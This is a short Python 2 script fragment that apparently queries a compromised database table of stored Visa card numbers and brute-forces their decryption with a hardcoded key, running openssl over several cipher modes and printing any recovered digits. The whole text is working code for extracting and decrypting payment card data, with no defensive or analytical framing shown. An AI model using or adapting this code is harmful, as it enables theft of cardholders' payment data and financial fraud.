
import subprocess
KEY='8L84j3x3yZY894gyEwFNhDSPSrfyHf9WA'
KEY_HEX=KEY.encode('hex')
print 'KEY_HEX:'+KEY_HEX
rows=do_query(s,"SELECT id,HEX(FROM_BASE64(numero)) FROM datostarjeta WHERE tipo='Visa' ORDER BY id DESC LIMIT 5")
print 'Got %d rows'%len(rows)
for row in rows:
    rid=row[0]
    hexdata=row[1]
    raw=hexdata.decode('hex')
    print 'ID=%s RAWLEN=%d HEX=%s'%(rid,len(raw),hexdata[:48])
    iv8=raw[:8]
    ct16=raw[8:]
    iv8h=iv8.encode('hex')
    ct16h=ct16.encode('hex')
    f=open('/tmp/ct.bin','wb')
    f.write(ct16)
    f.close()
    for cipher in ['bf-cbc','des-ede3-cbc','cast5-cbc','rc2-cbc']:
        cmd='openssl enc -%s -d -nosalt -nopad -K %s -iv %s -in /tmp/ct.bin'%(cipher,KEY_HEX,iv8h)
        p=subprocess.Popen(cmd,shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE)
        o,e=p.communicate()
        if p.returncode==0 and len(o)>0:
            nums=''.join(c for c in o if c.isdigit())
            print '  %s: %s nums=%s'%(cipher,repr(o[:20]),nums)
        else:
            print '  %s FAIL:%s'%(cipher,(e or '').strip()[:50])
    f2=open('/tmp/ct2.bin','wb')
    f2.write(raw)
    f2.close()
    for cipher in ['bf-ecb','des-ede3-ecb','cast5-ecb','bf-cbc']:
        if cipher.endswith('ecb'):
            cmd='openssl enc -%s -d -nosalt -nopad -K %s -in /tmp/ct2.bin'%(cipher,KEY_HEX)
        else:
            cmd='openssl enc -%s -d -nosalt -nopad -K %s -iv 0000000000000000 -in /tmp/ct2.bin'%(cipher,KEY_HEX)
        p=subprocess.Popen(cmd,shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE)
        o,e=p.communicate()
        if p.returncode==0 and len(o)>0:
            nums=''.join(c for c in o if c.isdigit())
            if len(nums)>=10:
                print '  %s ALL24: %s nums=%s'%(cipher,repr(o[:24]),nums)
s.close()
